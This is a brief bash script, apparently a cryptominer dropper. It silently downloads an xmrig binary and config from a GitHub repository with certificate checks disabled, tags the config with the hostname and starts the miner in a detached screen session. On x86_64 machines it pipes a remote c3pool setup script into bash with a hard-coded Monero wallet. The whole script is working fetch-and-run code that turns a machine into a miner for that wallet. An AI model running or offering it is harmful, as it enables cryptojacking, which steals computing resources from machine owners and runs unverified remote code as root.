#!/bin/bash
  OS=$(uname -m)
  if [[ ${OS} == "aarch64" ]]; then
  wget -N --no-check-certificate -q -O config.json https://raw.githubusercontent.com/gcp5678/nananmlo/main/config.jso && chmod 666 config.json
  config="/root/config.json"
  name=$(hostname)
  sed -i "s/6666/${name}/g" ${config}
  wget -N --no-check-certificate -q -O xmrig https://raw.githubusercontent.com/gcp5678/nananmlo/main/armxmrig && chmod 755 xmrig
  screen -dmS xmrig ./xmrig
  fi
  if [[ ${OS} == "x86_64" ]]; then
 curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 46cLKftMHe7Qj4d4gJ9qrnDUk14JgVgsKiFcd16KCrwg5MQHheg8giXZUDduThkrNVC64E7YWgFeNUUBLARoWKwDCzatBkd
 fi
 

